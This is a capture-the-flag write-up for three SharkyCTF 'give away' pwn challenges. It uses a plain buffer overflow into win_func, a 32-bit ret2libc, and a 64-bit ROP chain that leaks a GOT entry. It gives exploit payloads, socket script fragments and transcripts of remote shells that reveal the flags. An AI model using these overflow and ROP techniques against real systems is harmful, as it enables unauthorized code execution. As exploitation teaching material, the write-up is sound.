# give away pwn challenges

The writeup for all 3 give away challenges

## give away 0

A classic buffer overflow - decompiled with ghidra (or use https://github.com/h4sh5/ghidra-headless-decompile)

```c

void win_func(void)

{
  execve("/bin/sh",(char **)0x0,(char **)0x0);
  return;
}

void vuln(void)
{
  char local_28 [32];
  
  fgets(local_28,0x32,stdin);  // <============= 0x32 is 50
  return;
}

undefined8 main(void)
{
  init_buffering();
  vuln();
  return 0;
}

```

We can overflow into return address, and jump to win_func.

Find out that there is no PIE on the executable (just run it in gdb, and `break main` then `run` a few times, and find win_func address:

```
objdump -t 0_give_away | grep win
00000000004006a7 g     F .text	000000000000001d              win_func
```

you can also use checksec to see its security options
```
checksec --file=0_give_away
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   71 Symbols     No	0		1	0_give_away
```
no PIE :)


Enter the win_func address into the buffer after testing overflows (test with `"A" * <big numer> + "B"*8`  because addresses are 64 bit (8 bytes). Remember it is small endian so we swap it around (a7064000 00000000):

python exploit `0_print.py`:
```py
print("A"*40 + "\xa7\x06\x40\x00" + "\x00"*4)
```

We need to keep the pipe open when we pipe to the ncat session (cos its a shell!)
```
cat <(./0_print.py) - | ncat -v sharkyctf.xyz 20333
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 149.202.221.103:20333.
id
uid=1000(pwnuser) gid=1001(pwnuser) groups=1001(pwnuser),1000(ctf)
ls
0_give_away
flag.txt
start.sh
cat flag.txt
shkCTF{#Fr33_fL4g!!_<3}


```


## give away 1

So this is a 32 bit executable:
```
$ file give_away_1
give_away_1: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2b72e93281e97df94bf8362d5cf5a29f55accb8a, not stripped
```


A libc is also provied:
```
libc-2.27.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=0e188ec5f09c187a7a92784d4b97aa251b15a93c, for GNU/Linux 3.2.0, stripped
```

So after some testing (just putting in lots of "A"s + "BBBB") (4 "B"s because addresses are 32 bit)

again, decompiling with ghidra:
```c

void vuln(void)

{
  int iVar1;
  undefined local_24 [28];
  
  iVar1 = __x86_get_pc_thunk_ax();
  FUN_000104c8(local_24,0x32,**(undefined4 **)(iVar1 + 0x191f));
  return;
}


// WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx

undefined4 main(void)

{
  init_buffering(&stack0x00000004);
  FUN_000104c0("Give away: %p\n",system);
  vuln();
  return 0;
}

```

there's no win_func this time, so we can use ret2libc (google it!)
it looks something like this in 32 bit:

```
*            dummy bytes         dummy bytes     arg1 for system()
*           /           /       /
* |------------------|---------|------------|------|------------------|
* | buffer_fill_up   |  AAAA   |  &system   | BBBB |addr of "/bin/sh" |
* |------------------|---------|------------|------|------------------|
*     buffer      saved-EBP      RET
*
```

### addr of system

I loaded the libc binary into Ghidra to find system addr:

                     **************************************************************
                     *                          FUNCTION                          *
                     **************************************************************
                     undefined system()
     undefined         AL:1           <RETURN>
                     __libc_system                                   XREF[2]:     Entry Point(*), 002be860  
                     system
	0014f440 48 85 ff        TEST       RDI,RDI
	0014f443 74 0b           JZ         LAB_0014f450
	0014f445 e9 66 fa        JMP        FUN_0014eeb0                                     undefined FUN_0014eeb0()
	         ff ff
	                     -- Flow Override: CALL_RETURN (CALL_TERMINATOR)


system is at 0014f440 (again, statically)


Since the leak give away is already the address of system, we just need to 

### addr of /bin/sh

using `info proc map` in gdb, and find on 3rd libc mapping area
```
(gdb) find 0xf7f3e000, 0xf7fad000 , "/bin/sh"
0xf7f57406
1 pattern found.
```

in here:
```

0x56557000 0x56558000     0x1000     0x1000 /mnt/share/sharky/give_away_1
0xf7dcf000 0xf7dec000    0x1d000        0x0 /usr/lib/i386-linux-gnu/libc-2.30.so
0xf7dec000 0xf7f3e000   0x152000    0x1d000 /usr/lib/i386-linux-gnu/libc-2.30.so
0xf7f3e000 0xf7fad000    0x6f000   0x16f000 /usr/lib/i386-linux-gnu/libc-2.30.so <-- /bin/sh
0xf7fad000 0xf7faf000     0x2000   0x1dd000 /usr/lib/i386-linux-gnu/libc-2.30.so
0xf7faf000 0xf7fb1000     0x2000   0x1df000 /usr/lib/i386-linux-gnu/libc-2.30.so
0xf7fb1000 0xf7fb3000     0x2000        0x0
0xf7fcd000 0xf7fcf000     0x2000        0x0
0xf7fcf000 0xf7fd2000     0x3000        0x0 [vvar]
0xf7fd2000 0xf7fd4000     0x2000        0x0 [vdso]
0xf7fd4000 0xf7fd5000     0x1000        0x0 /usr/lib/i386-linux-gnu/ld-2.30.so
0xf7fd5000 0xf7ff1000    0x1c000     0x1000 /usr/lib/i386-linux-gnu/ld-2.30.so
0xf7ff1000 0xf7ffc000     0xb000    0x1d000 /usr/lib/i386-linux-gnu/ld-2.30.so

```

in my kali's gdb, 0xf7e13630 is system. So we subtract.
```
(gdb) p 0xf7f57406 - 0xf7e13630
$3 = 1326550
```
so system + 1326550 *should* be /bin/sh

However, the remote system is different so it took some massaging when writing my give1.py

At first when I used the offset, it said "roadcast: not found" which indicates its calling system("roadcast"). This sounds like part of the word "broadcast", after I loaded the libc into a hex editor and searched for the word.


```
system: f7e16200
binsh: 0xf7f59fd2
ready?
cmd $ //////////bin/ls
sh: 1: roadcast: not found

```


Then I had to manually subtract the offset I found in the hex editor between "/bin/sh" and "roadcast":

```py
...
s=socket.socket()
# sharkyctf.xyz
s.connect((sys.argv[1],20334))
sysaddr = s.recv(1024).split(': ')[1].lstrip('0x').strip()
sysaddr = sysaddr.decode('hex')[::-1]

libc_diff = 1326550 + 5 - 12033 - 11 # ->/bin/sh
binsh = hex(int(sysaddr[::-1].encode('hex'), 16) + libc_diff)

```

Final output:

```
./give1.py sharkyctf.xyz
system: f7d4c200
binsh: 0xf7e8d0cf
ready?
cmd $ id
/bin/sh: 1: d: not found

cmd $ id
uid=1000(pwnuser) gid=1001(pwnuser) groups=1001(pwnuser),1000(ctf)

cmd $ cat flag.txt
cashkCTF{I_h0PE_U_Fl4g3d_tHat_1n_L3ss_Th4n_4_m1nuT3s}

cmd $ cat start.sh
#!/bin/bash

while :
do
    su -c "exec socat TCP-LISTEN:20334,reuseaddr,fork EXEC:/pwn/give_away_1,stderr" - pwnuser;
done

cmd $ cat /etc/os-release
NAME="Ubuntu"
VERSION="18.04.4 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.4 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic


```

That took me longer than I liked. I took down the os-release for environement replication reasons - see below.

## give away 2

```
file give_away_2
give_away_2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5c93b7c4ff1a036cb291045d3ab76155d22ce1a6, not stripped
```

- looks the same as give away 1, but 64 bit, and the leak is main instead of system:

```c
void vuln(void)

{
  char local_28 [32];
  
  fgets(local_28,0x80,stdin);
  return;
}

undefined8 main(void)

{
  init_buffering();
  printf("Give away: %p\n",main);
  vuln();
  return 0;
}
```

yikes. I guess we need to do some sort of ropchain to further leak addresses.

initialling I tried to ROP by looking at things in the PLT:
```
(gdb) info func plt
All functions matching regular expression "plt":

File ../elf/dl-runtime.c:
478:	void _dl_call_pltexit(struct link_map *, Elf64_Word, const void *, void *);

Non-debugging symbols:
0x0000555555554690  printf@plt
0x0000555555554698  fgets@plt
0x00005555555546a0  setvbuf@plt
0x00005555555546a8  __cxa_finalize@plt
0x00007ffff7fd5010  _dl_catch_exception@plt
0x00007ffff7fd5020  malloc@plt
0x00007ffff7fd5030  _dl_signal_exception@plt
0x00007ffff7fd5040  calloc@plt
0x00007ffff7fd5050  realloc@plt
0x00007ffff7fd5060  _dl_signal_error@plt
```

Ok so there is printf. That's useful. But printf usually has a format string - what do I do?
I can see how printf is being called in main:

```c
   0x0000555555554872 <+14>:	lea    -0x15(%rip),%rsi        # 0x555555554864 <main>
   0x0000555555554879 <+21>:	lea    0xa4(%rip),%rdi        # 0x555555554924
   0x0000555555554880 <+28>:	mov    $0x0,%eax
   0x0000555555554885 <+33>:	callq  0x555555554690 <printf@plt>
```

well, rdi looks like the fmt string:
```
(gdb) x/s 0x555555554924
0x555555554924:	"Give away: %p\n"
```

So I can technically rop to the the address 0x0000555555554879 (main+21) so that it sets up `rdi` nicely for me with a `%p`, then slide down to printf to leak something new, then go back into `vuln` automatically. Great.

But using this I realized can only leak 1 address, and I don't even know if it would be useful. It also seem to crash afterwards.. So gotta try harder.

Why don't I just p`rintf()` without a format string? Not like it matters. I don't have to have one. I can just decode the output manually, after receiving it.

Since printf() uses rdi as the first pointer to print, I looked for something that would pop rdi off the stack with ROPgadget (`pip install ROPgadget`)

```
ROPgadget --binary give_away_2 --dump | grep rdi
...
0x0000000000000903 : pop rdi ; ret // 5fc3
```
Yay! found it.

I also found these two really helpful articles on ROPing with an unknown (well in this case known) libc:
https://tasteofsecurity.com/security/ret2libc-unknown-libc/
https://www.reddit.com/r/LiveOverflow/comments/7w6xec/leaking_libc/

The reddit thread says to leak something from GOT (Global Offset Table), because entries in GOT will contain accurate runtime addresses of certain libc symbols! Awesome.

Building on the previous exploits, if we can leak a GOT entry by popping its address into RDI, then calling printf(), we can know the address of libc functions.

```
(gdb) info file
....
	0x0000555555754fa0 - 0x0000555555755000 is .got

(gdb) x 0x0000555555754fa0
(keep hitting enter)
(gdb) x 0x0000555555754fa0
0x555555754fa0:	0x00200de0
(gdb)
0x555555754fa4:	0x00000000
(gdb)
0x555555754fa8:	0x00000000
(gdb)
0x555555754fac:	0x00000000
(gdb)
0x555555754fb0:	0x00000000
(gdb)
0x555555754fb4:	0x00000000
(gdb)
....
0x555555755020 <stdout@@GLIBC_2.2.5>:	0xf7fad6a0
(gdb)
0x555555755024 <stdout@@GLIBC_2.2.5+4>:	0x00007fff
(gdb)
0x555555755028:	0x00000000
(gdb)
0x55555575502c:	0x00000000
(gdb)
0x555555755030 <stdin@@GLIBC_2.2.5>:	0xf7fac980
(gdb)
0x555555755034 <stdin@@GLIBC_2.2.5+4>:	0x00007fff
(gdb)
0x555555755038:	0x00000000
```

So we found stdout@@GLIBC. That can work.

We can use the address of main to offset to that
```
objdump -t give_away_2 | grep stdout
0000000000201020 g     O .bss	0000000000000008              stdout@@GLIBC_2.2.5
objdump -t give_away_2 | grep main
0000000000000000       F *UND*	0000000000000000              __libc_start_main@@GLIBC_2.2.5
0000000000000864 g     F .text	0000000000000037              main
```

0x201020 - 0x864 = 2099132

Now we have everything - the pop rdi gadget, the GOT entry address and the printf function call in main. We can cause the leak:
```py
s.send("A" * offset + poprdi + stdoutgot + mainprintf + "\n")
```

After the leak, it's just a matter of figuring out offsets to libc's other places (system, "/bin/sh"..) We can figure that out just by looking at the libc file and finding offsets between the symbols.

according to this article https://tasteofsecurity.com/security/ret2libc-unknown-libc/, ret 2 system looks like this on 64 bit:
```py
rop2 = base + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
```
He's using pwntools here, which is nice. I was not use to pwntools yet so I just used a similar structure with regular sockets:

```py
s.send("A"*offset + ret + poprdi + binsh + system + "\n")
```

Also, debugging on a replicated environment really helped. I noticed from the previous challenge that it was using 18.04, so I setup a VM and debugged with that exact version of the system (even the libc md5 hash matches up!)

setting up the binary in ncat in the Ubuntu VM:
`ncat -e ./give_away_2 -nklvp 20335`

Then firing up the exploit and wait for "ready" prompt. When shown, attach GDB to the process:

```
gdb -p `pgrep -f give_away_2 | head -n3 | tail -n1`
```

Then hit enter on the "Ready?" prompt to continue the python exploit.

This way you can see if everything is working locally before firing up to the remote system. Everything should function the same.

Also sometimes the leak doesn't work very nicely because printf() stops on null bytes. When this happens just run it again til it works. 

Finally:

```
./give2.py sharkyctf.xyz
padding 4 0s
main: 000055ca3c8ea864
padding 4 0s
leakrop: 000055ca3c8ea879
padding 4 0s
leakrop: 000055ca3c8ea885
padding 4 0s
poprsi: 000055ca3c8ea901
padding 4 0s
poprdi: 000055ca3c8ea903
padding 4 0s
ret: 000055ca3c8ea676
padding 4 0s
stdout@got: 000055ca3caeb020
----------------------------------------
padding 4 0s
poprbp: 000055ca3c8ea710
ready?
padding 4 0s
leak:  00007f335744f760
padding 4 0s
system: 00007f33570b2440
padding 4 0s
binsh: 00007f3357216e9a
final payload sent.
cmd $ ls
flag.txt
give_away_2
start.sh

cmd $ cat flag.txt
shkCTF{It's_time_to_get_down_to_business}

cmd $ cat start.sh
#!/bin/bash

while :
do
    su -c "exec socat TCP-LISTEN:20335,reuseaddr,fork EXEC:/pwn/give_away_2,stderr" - pwnuser;
done

cmd $
```

If you want a similar challenge (say, to rewrite the exploit with pwntools, checkout the ropme pwn challenge in hackthebox https://www.hackthebox.eu/)






